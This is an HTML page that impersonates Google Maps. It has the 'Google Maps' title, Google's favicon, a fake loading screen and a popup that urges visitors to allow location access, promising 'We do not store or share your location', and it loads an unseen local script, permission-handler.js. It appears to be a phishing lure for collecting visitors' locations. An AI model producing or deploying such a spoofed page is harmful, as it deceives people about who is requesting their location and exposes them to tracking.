<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Maps</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://maps.gstatic.com/favicon3.ico">
</head>
<body>
  <!-- Loading Screen -->
  <div id="loading-screen">
    <div class="spinner"></div>
    <div class="loading-text">Loading Google Maps...</div>
    <div id="retry-location" onclick="retryLocation()">🔁</div>
  </div>

  <!-- Location Permission Popup -->
  <div id="location-popup" style="display:none;">
    <div class="popup-box">
      <div class="popup-title">Allow Location Access</div>
      <div class="popup-desc">We need your location to show nearby results.</div>
      <ul>
        <li>Tap “Allow” in the location request popup</li>
        <li>We do not store or share your location</li>
      </ul>
      <button onclick="retryLocation()">Try Again</button>
    </div>
  </div>

  <script src="permission-handler.js"></script>
</body>
</html>
